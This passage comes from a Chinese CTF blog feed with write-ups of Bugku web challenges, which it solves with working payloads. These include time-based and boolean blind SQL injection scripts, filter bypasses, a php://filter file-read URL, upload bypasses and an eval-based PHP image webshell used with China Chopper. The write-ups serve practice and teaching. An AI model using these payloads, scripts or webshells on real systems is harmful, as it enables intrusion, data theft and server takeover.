<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">11'+(<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> <span class="keyword">substr</span>((<span class="keyword">select</span> flag <span class="keyword">from</span> flag) <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>)=<span class="string">'a'</span> <span class="keyword">then</span> <span class="keyword">sleep</span>(<span class="number">5</span>) <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>python 脚本</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import <span class="built_in">string</span> </span><br><span class="line"></span><br><span class="line">mystring = <span class="built_in">string</span>.ascii_letters+<span class="built_in">string</span>.digits</span><br><span class="line">url=<span class="string">'http://120.24.86.145:8002/web15/'</span></span><br><span class="line">data = <span class="string">"127.0.0.1'+(select case when (substring((select flag from flag) from &#123;0&#125; for 1)='&#123;1&#125;') then sleep(5) else 1 end) and '1'='1"</span>  #这里的&#123;&#125;对应的是后面所需要的format</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">35</span>):</span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">j</span> in mystrin<span class="variable">g:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            headers = &#123;<span class="string">'x-forwarded-for'</span>:data.format(str(i),<span class="keyword">j</span>)&#125;</span><br><span class="line">            <span class="keyword">res</span> = requests.<span class="built_in">get</span>(url,headers=headers,timeout=<span class="number">3</span>)</span><br><span class="line">        except requests.exceptions.ReadTimeou<span class="variable">t:</span></span><br><span class="line">            flag += <span class="keyword">j</span></span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'The final flag:'</span>+flag</span><br></pre></td></tr></table></figure>

<p>这个代码的原理就是利用127.0.0.1+true/false去进行判断，如果是true，就与超时相违背，从而执行下面except的代码。</p>
<p>得到 flag{cdbf14c9551d5be5612f7bb5d2867853}</p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
        <tag>X_FORWARDED_FOR注入</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-Bugku-各种绕过</title>
    <url>/2018/08/18/Writeup/bugkuWeb/WP-Bugku-%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<p>题目地址<a href="http://120.24.86.145:8002/web7/" target="_blank" rel="noopener">http://120.24.86.145:8002/web7/</a></p>
<p>源码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">highlight_file(<span class="string">'flag.php'</span>);</span></span><br><span class="line"><span class="php">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]);</span></span><br><span class="line"><span class="php">$flag = <span class="string">'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'uname'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($_GET[<span class="string">'uname'</span>] == $_POST[<span class="string">'passwd'</span>])</span></span><br><span class="line"></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'passwd can not be uname.'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'uname'</span>]) === sha1($_POST[<span class="string">'passwd'</span>])&amp;($_GET[<span class="string">'id'</span>]==<span class="string">'margin'</span>))</span></span><br><span class="line"></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'sorry!'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>分析后发现，只要使uname的sha1和值与passwd的sha1的值相等即可，</p>
<p>但是同时他们两个的值又不能相等</p>
<p>那么构造数组<br>get传参:<br>?uname[]=1&amp;id=margin<br>同时post传参:<br>passwd[]=2<br><img src="https://i.imgur.com/upNrZlL.png" alt></p>
<p>得到 flag{HACK_45hhs_213sDD}</p>
<blockquote>
<p><a href="http://abelche.com/2018/08/08/Writeup/WP-Bugku-%E5%89%8D%E5%A5%B3%E5%8F%8B(SKCTF)/">这个和之前的前女友有点像，都是利用数组</a></p>
</blockquote>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-Bugku-文件上传2(湖湘杯)</title>
    <url>/2018/08/18/Writeup/bugkuWeb/WP-Bugku-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02-%E6%B9%96%E6%B9%98%E6%9D%AF/</url>
    <content><![CDATA[<p>题目地址<a href="http://120.24.86.145:9011/" target="_blank" rel="noopener">http://120.24.86.145:9011/</a></p>
<p>看大佬博客，直接构造的url，直接读取文件？？？？？？？</p>
<p><a href="http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=flag" target="_blank" rel="noopener">http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=flag</a></p>
<p><img src="https://i.imgur.com/Cza1zbe.png" alt></p>
<p>然后base64解码</p>
<p>得到flag{e00f8931037cbdb25f6b1d82dfe5552f}</p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-Bugku-求getshell</title>
    <url>/2018/08/17/Writeup/bugkuWeb/WP-Bugku-%E6%B1%82getshell/</url>
    <content><![CDATA[<p>题目地址<a href="http://120.24.86.145:8002/web9/" target="_blank" rel="noopener">http://120.24.86.145:8002/web9/</a></p>
<p>打开后发现  My name is margin,give me a image file not a php</p>
<p>上传一个php文件不让上传，那么BP抓包</p>
<p>经过测试，将 Content-Type: 后参数改大写，修改文件名后缀为 .php5 ，文件类型改为图片类型 image/jpg 可以获得flag</p>
<p><img src="https://i.imgur.com/O2YUor4.png" alt></p>
<p>得到 KEY{bb35dc123820e}</p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-Bugku-文件包含2</title>
    <url>/2018/08/17/Writeup/bugkuWeb/WP-Bugku-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB2/</url>
    <content><![CDATA[<p>题目地址<a href="http://118.89.219.210:49166/" target="_blank" rel="noopener">http://118.89.219.210:49166/</a></p>
<p>进入题目后发现这个页面，什么都没有<br><img src="https://i.imgur.com/kuzWImF.png" alt></p>
<p>查看源代码</p>
<p>第一行发现</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- upload.php --&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问 <a href="http://118.89.219.210:49166/index.php?file=upload.php" target="_blank" rel="noopener">http://118.89.219.210:49166/index.php?file=upload.php</a></p>
<p>出现上传页面<br><img src="https://i.imgur.com/6sbFRtZ.png" alt></p>
<h1 id="CASE-01"><a href="#CASE-01" class="headerlink" title="- CASE 01"></a><font size="10" color="darkViolet">- CASE 01</font></h1><blockquote>
<p><font size="4" color="darkred">这种方法是直接利用命令<code>system(&quot;ls&quot;);</code>来查看目录找到flag</font></p>
</blockquote>
<br>
只能上传图片，对大小有限制，那么上传个图片马

<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>php <span class="keyword">system</span>(<span class="string">"ls"</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上传后提示:<br><img src="https://i.imgur.com/tr8R2S4.png" alt></p>
<p>那么就访问upload/201808170638381043.jpg<br>构造url<br><a href="http://118.89.219.210:49166/index.php?file=upload/201808170638381043.jpg" target="_blank" rel="noopener">http://118.89.219.210:49166/index.php?file=upload/201808170638381043.jpg</a></p>
<p>发现后台把<code>&lt;?php</code>,<code>?&gt;</code>替换成了<code>_</code>,<code>_</code><br><img src="https://i.imgur.com/UP3KLHo.png" style="float:left;"></p>
<br>
那么用`<script>`标签绕过
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">langulage</span>=<span class="string">php</span>&gt;</span></span><br><span class="line"><span class="actionscript">system(<span class="string">"ls"</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>再次上传，并打开文件所在地址</p>
<p>发现解析成功</p>
<p>页面出现如下内容<br><img src="https://i.imgur.com/QWjItSt.png" alt=""></p>
<p>直接访问 this_is_th3_F14g_154f65sd4g35f4d6f43.txt</p>
<p>构造url:<br><a href="http://118.89.219.210:49166/index.php?file=this_is_th3_F14g_154f65sd4g35f4d6f43.txt">http://118.89.219.210:49166/index.php?file=this_is_th3_F14g_154f65sd4g35f4d6f43.txt</a></p>
<p>得到 SKCTF{uP104D_1nclud3_426fh8_is_Fun}</p>
<hr>
<h1 id="CASE-02"><a href="#CASE-02" class="headerlink" title="- CASE 02"></a><font size=10 color=darkViolet>- CASE 02</font></h1><blockquote>
<p><font size=4 color=darkred>这种方法是上传木马后利用中国菜刀</font></p>
</blockquote>
<p>有了上一次的经验，这里直接:<br>文件名 1.php;.jpg<br>内容:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">php</span>&gt;</span></span><br><span class="line"><span class="actionscript">echo <span class="string">'aaaa'</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">eval</span>($_POST[<span class="string">'aaaa'</span>]);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上传后访问<br><a href="http://118.89.219.210:49166/index.php?file=upload/201808170651501676.jpg">http://118.89.219.210:49166/index.php?file=upload/201808170651501676.jpg</a></p>
<p>发现成功显示了 aaaa</p>
<p>那么上菜刀<br><img src="https://i.imgur.com/vQFHaDE.png" alt=""></p>
<p>连接成功后<br><img src="https://i.imgur.com/fcV6xH2.png" alt=""></p>
<p>打开tx文件得到 SKCTF{uP104D_1nclud3_426fh8_is_Fun}</p>
<hr>
</script>]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
        <tag>文件包含</tag>
        <tag>图片马</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-Bugku-login3(SKCTF)</title>
    <url>/2018/08/17/Writeup/bugkuWeb/WP-Bugku-login3-SKCTF/</url>
    <content><![CDATA[<p>题目地址<a href="http://118.89.219.210:49167/" target="_blank" rel="noopener">http://118.89.219.210:49167/</a></p>
<p>username输入admin，结果是存在的，返回密码错误</p>
<p>admin后加上单引号，但是返回是使用者名称不存在</p>
<p>这意味着什么呢？ 这说明即使语法错误，也不会在页面上显示报错资讯，</p>
<p>也就不能使用报错注入了，我们发现有两种返回资讯:</p>
<p>username does not exist!和password error!,那我们可以利用这两个返回值进行布林盲注。</p>
<p>毕竟我也是第一次接触到这种布林型盲注，也当是小白扫盲吧，怎么利用啰嗦几句。</p>
<p>我们猜测后台的验证应该是先查询我们输入的使用者名称是否存在，大概是:</p>
<p>select password,username from users where username=”我们输入的使用者名称”</p>
<p>如果我们在where语句的结尾加上一个and连线的布林判断语句，就可以根据返回值判断where条件是否成立，比如这道题就可以尝试补成</p>
<p>where username=’admin’ and (substring(database(),1,1)=’a’)</p>
<p>如果返回值是password error，那么就说明where语句是成立的，那么我们补充的那就也是成立的，那么就可以确定资料库的第一位是a,然后再猜测第二位。</p>
<p>但是这道题过滤了and！ ！ ！</p>
<p>尝试加上and返回:<br>经过尝试发现还过滤了空格，逗号，等号，for</p>
<p>空格用括号代替，等号用&lt;&gt;(一种不等号)代替</p>
<p>那怎么办呢，这就用上了今天介绍的异或运算^,先说一下基本规则:</p>
<p>1^1=0 1^0=1 0^0=0</p>
<p>就是说只有两个不同的布林值运算结果为1，其他为零</p>
<p>不过在这里用的时候先不要按这个规则去推，因为在我们用到的三个值的布林运算的sql语句中完全相反，我还没有搞明白，谁懂得话，给我评论下。</p>
<p>首先说下这里我们要补上两个布林值，这个最后再说为什么。</p>
<p>先猜资料库名，基本语句</p>
<p>admin’^(ascii(mid(database()from(1)))&lt;&gt;97)^0#</p>
<p>解释一下为什么，为了绕过空格过滤，用括号隔开，过滤了等号，用不等号&lt;&gt;代替，只要是布林值就可以。 mid()函式和substring()一样，一种写法是mid(xxx,1,1)，另一种是mid(xxx,from 1 for 1)但是这里过滤了for和逗号，那么怎么办呢？</p>
<p>这里用到了ascii()取ascii码值的函式，如果传入一个字串那么就会取第一个字元的字元的ascii码值，这就有了for的作用，并且mid()函式是可以只写from的表示从第几位往后的字串，我们将取出的字串在传入ascii()中取第一位，就完成了对单个字元的提取。</p>
<p>每个字元的ascii码判断是不是不等于给定的数字，会得到一个布林值(0或1)再与结尾的0进行运算。</p>
<p>如果资料库名的第一位的ascii码值不是97，where条件是username=’admin’^1^0</p>
<p>返回值是username does not exist!</p>
<p>如果资料库名的第一位的ascii码值是97，where条件是username=’admin’^0^0</p>
<p>返回值会是password error!</p>
<p>这就构成了布林报错注入。</p>
<p>有人可能疑问大部分的判断都是无用的，就是说可能从97尝试到120都是username does not exist!，那如何快速找到语句成立时的返回结果(password error!)。 这里就是最后^0的妙用了，</p>
<p>因为’admin’^0^0和’admin’^1^1是一样的，我们可以构造后者来看前者成立时的情况。</p>
<p>补充一点，因为这里既是语法错误也不会报错，有可能你输入的语句就不可能成立，但你也不知道，就很麻烦了，不过可以改变最后是^0还是^1，如果改不改返回值相同，那就是有语法错误，如果不同就可以参照上一段了。 这也是为什么要多加一个^0,看似多此一举，其实好处多多。</p>
<p>就是说admin’^(ascii(mid(database()from(1)))&lt;&gt;97)^1# 就可以得到password error!</p>
<p>资料库名最后可以得到是:blindsql</p>
<p>下一步猜表名，表名好像没法暴力猜,因为关键词information被禁了！ ！ ！ ！ 那资料库名就没用了，哈哈哈，不过后面猜栏位的值是一样的原理，不亏不亏。</p>
<p>没法用系统表，就不能像上面一样爆破了，真的是猜了，是admin表，语句如下</p>
<p>admin’^(select(1)from(admin))^1# 返回password error!说明猜对了</p>
<p>猜栏位 admin’^(select(count(password))from(admin))^1# 返回password error!说明猜对了。</p>
<p>为什么要用count()呢，因为如果有多行资料也可能会报错，会干扰判断。</p>
<p>然后猜password的值，暴力猜解，与猜资料库类似:</p>
<p>admin’^(ascii(mid((select(password)from(admin))from(1)))&lt;&gt;97)^0#</p>
<p>得到密码的MD5值:51b7a76d51e70b419f60d3473fb6f900，解密后登陆，得到flag </p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import requests <span class="attribute">str_all</span>=<span class="string">"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ &#123;&#125; -*/="</span> <span class="attribute">url</span>=<span class="string">"http://118.89.219.210:49167/index.php"</span> <span class="attribute">r</span>=requests.session() def databasere(): <span class="attribute">resutlt</span>=<span class="string">""</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(30): fla = 0 <span class="keyword">for</span> j <span class="keyword">in</span> str_all: <span class="attribute">playlod</span>=<span class="string">"admin'^(ascii(mid(database()from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#"</span>.format(str(i),ord(j)) data = &#123; <span class="string">"username"</span>: playlod, <span class="string">"password"</span>: <span class="string">"123"</span> &#125; <span class="attribute">s</span>=r.post(url,data) <span class="builtin-name">print</span>(playlod) <span class="keyword">if</span> <span class="string">"error"</span> <span class="keyword">in</span> s.text: resutlt =j <span class="builtin-name">print</span>(resutlt) <span class="keyword">if</span> fla == 0: break def password(): <span class="attribute">resutlt</span>=<span class="string">""</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(40): <span class="attribute">fla</span>=0 <span class="keyword">for</span> j <span class="keyword">in</span> str_all: playlod = <span class="string">"admin'^(ascii(mid((select(password)from(admin))from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#"</span>.format(str(i 1),ord(j)) data = &#123; <span class="string">"username"</span>: playlod, <span class="string">"password"</span>: <span class="string">"123"</span> &#125; <span class="attribute">s</span>=r.post(url,data) <span class="builtin-name">print</span>(playlod) <span class="keyword">if</span> <span class="string">"error"</span> <span class="keyword">in</span> s.text: resutlt =j <span class="attribute">fla</span>=1 <span class="builtin-name">print</span>(<span class="string">'**************************'</span>,resutlt) <span class="keyword">if</span> <span class="attribute">fla</span>==0: break #databasere() password()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
        <tag>基于布尔的SQL盲注</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-Bugku-细心</title>
    <url>/2018/08/16/Writeup/bugkuWeb/WP-Bugku-%E7%BB%86%E5%BF%83/</url>
    <content><![CDATA[<p>题目地址<a href="http://120.24.86.145:8002/web13/" target="_blank" rel="noopener">http://120.24.86.145:8002/web13/</a></p>
<p>进入后发现是一个404错误页面</p>
<p>参考大佬WP，查看robots.txt</p>
<p>发现有:<br>User-agent: *<br>Disallow: /resusl.php</p>
<p>访问/resusl.php后看到<br><code>if ($_GET[x]==$password) 此处省略1w字</code></p>
<p>那么就要GET传参，</p>
<p>(看大佬WP传了admin，可能是题目和管理员有关吧…..)</p>
<p>构造payload<br>?x=admin</p>
<p>得到flag(ctf_0098_lkji-s)</p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-Bugku-web8</title>
    <url>/2018/08/16/Writeup/bugkuWeb/WP-Bugku-web8/</url>
    <content><![CDATA[<p>题目地址<a href="http://120.24.86.145:8002/web8/" target="_blank" rel="noopener">http://120.24.86.145:8002/web8/</a></p>
<p>打开后有源码，代码审计</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">extract($_GET);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">$f = trim(file_get_contents($fn));</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($ac === $f)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;This is flag:"</span> .<span class="string">" $flag&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;sorry!&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>可以看出得到flag的途径是ac的值不为空，并且f的值从文件fn中获取，并且ac的值要恒等于f的值</p>
<p>构造payload<br><code>?ac=flags&amp;fn=flag.txt</code></p>
<p>得到This is flag: flag{3cfb7a90fc0de31}</p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>web</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-Bugku-程序员本地网站</title>
    <url>/2018/08/16/Writeup/bugkuWeb/WP-Bugku-%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%AB%99/</url>
    <content><![CDATA[<p>题目地址<a href="http://120.24.86.145:8002/localhost/" target="_blank" rel="noopener">http://120.24.86.145:8002/localhost/</a></p>
<p>进入后提示从本地访问</p>
<p>那么BP抓包</p>
<p>加上这一行:<br>X-Forwarded-For: 127.0.0.1</p>
<blockquote>
<p><a href="https://zh.wikipedia.org/wiki/X-Forwarded-For" target="_blank" rel="noopener"><font color="darkViolet">X-Forwarded-For</font></a>: 简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。</p>
</blockquote>
<p><img src="https://i.imgur.com/JBezurP.png" alt></p>
<p>得到flag{loc-al-h-o-st1}</p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-Bugku-flag.php</title>
    <url>/2018/08/16/Writeup/bugkuWeb/WP-Bugku-flag.php/</url>
    <content><![CDATA[<p>题目地址<a href="http://120.24.86.145:8002/flagphp/" target="_blank" rel="noopener">http://120.24.86.145:8002/flagphp/</a></p>
<p>进入题目后看到的是登录框，题目提示“点了login咋没反应，提示:hint”</p>
<p>参考网上的WP，</p>
<p>GET传参，构造后的url:<br><a href="http://120.24.86.145:8002/flagphp/?hint" target="_blank" rel="noopener">http://120.24.86.145:8002/flagphp/?hint</a></p>
<p>就得到源码了:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);</span></span><br><span class="line"><span class="php">$cookie = $_COOKIE[<span class="string">'ISecer'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hint'</span>]))&#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">elseif</span> (unserialize($cookie) === <span class="string">"$KEY"</span>)</span></span><br><span class="line"><span class="php">&#123;   </span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"$flag"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"admin.css"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">action</span>=<span class="string">"#"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"user"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"Username"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">placeholder</span>=<span class="string">"Password"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"Login"</span> <span class="attr">type</span>=<span class="string">"button"</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$KEY=<span class="string">'ISecer:www.isecer.com'</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>意思是当得到 unserialize (反序列化)后的$cookie这个<code>ISecer</code>全等于<code>$KEY</code>后显示 flag<br>这里要注意，<code>$KEY</code>的值并不是<code>$KEY=&#39;ISecer:www.isecer.com&#39;;</code>所显示的，而是<code>&quot;&quot;</code>，即空</p>
<p>那么php脚本一行:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">print_r(serialize(<span class="string">""</span>));</span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>得到结果:<br><code>s:0:&quot;&quot;;</code></p>
<p>BP抓包Go一下:<br><img src="https://i.imgur.com/A9zaA4d.png" alt><br>得到flag{unserialize_by_virink}</p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>web</tag>
        <tag>反序列化</tag>
        <tag>unserialize</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-Bugku-Cookies欺骗</title>
    <url>/2018/08/14/Writeup/bugkuWeb/WP-Bugku-Cookies%E6%AC%BA%E9%AA%97/</url>
    <content><![CDATA[<p>关于python <a href="http://docs.python-requests.org/zh_CN/latest/user/advanced.html" target="_blank" rel="noopener">requests.Session()</a></p>
<p>首先看到url上有base64编码<br>解码后是 keys.txt</p>
<p>url参数line是按行返回<br>参考网上的脚本:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="attribute">s</span>=requests.Session()</span><br><span class="line"><span class="attribute">url</span>=<span class="string">'http://120.24.86.145:8002/web11/index.php'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,20):</span><br><span class="line">    payload=&#123;<span class="string">'line'</span>:str(i),<span class="string">'filename'</span>:<span class="string">'aW5kZXgucGhw'</span>&#125;</span><br><span class="line">    <span class="attribute">a</span>=s.get(url,params=payload).content</span><br><span class="line">    <span class="attribute">content</span>=str(a,encoding="utf-8")</span><br><span class="line">    <span class="builtin-name">print</span>(content)</span><br></pre></td></tr></table></figure>

<p>得到源码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><br><span class="line"></span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line"><span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>]==<span class="string">'margin'</span>)&#123;</span><br><span class="line"></span><br><span class="line">$file_list[<span class="number">2</span>]=<span class="string">'keys.php'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line"></span><br><span class="line">$fa = file($file);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $fa[$line];</span><br><span class="line"></span><br><span 